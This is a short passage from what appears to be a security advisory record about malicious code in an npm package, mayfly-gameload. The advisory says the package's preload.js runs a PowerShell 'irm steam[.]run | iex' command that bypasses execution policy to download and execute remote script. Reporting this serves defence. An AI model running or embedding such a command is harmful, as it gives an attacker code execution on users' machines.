  "summary": "Malicious code in mayfly-gameload (npm)",
  "details": "A Steam game-manager Electron plugin whose preload.js exposes installSteamCoreSilent(), which executes powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm steam[.]run | iex\" — a download-and-execute remote code-execution channel pulling and running script content from steam[.]run, which is not an official Steam domain.",
